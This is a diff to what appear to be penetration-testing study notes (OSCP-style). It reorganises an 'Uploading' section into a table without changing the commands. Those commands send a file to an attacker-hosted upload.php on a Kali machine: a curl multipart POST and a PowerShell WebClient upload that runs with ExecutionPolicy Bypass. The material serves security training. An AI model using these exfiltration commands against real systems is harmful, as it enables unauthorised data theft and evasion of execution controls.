@@ -112,14 +112,7 @@ curl -o /var/www/html/upload.php https://raw.githubusercontent.com/joetanx/oscp/
 
 ## 4.2. Uploading
 
-### Using curl
-
-```console
-curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php
-```
-
-### Using `UploadFile` method of `System.Net.WebClient`
-
-```console
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','The Little Prince.jpg')
-```
+|   |   |
+|---|---|
+|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://kali.vx/upload.php','The Little Prince.jpg')`|
+|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"The Little Prince.jpg" -v http://kali.vx/upload.php`|
